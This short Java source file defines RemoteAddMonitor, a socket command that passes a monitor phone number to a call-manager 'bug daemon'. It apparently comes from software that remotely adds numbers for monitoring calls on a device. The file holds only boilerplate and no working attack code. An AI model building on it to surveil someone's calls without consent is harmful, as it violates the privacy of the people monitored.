package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.MonitorNumber;

public class RemoteAddMonitor extends SocketCmd<MonitorNumber, Boolean> {
	
	private static final long serialVersionUID = 2192184268450011201L;
	
	private static final String TAG = "RemoteAddMonitor";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteAddMonitor(MonitorNumber monitor) {
		super(monitor, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
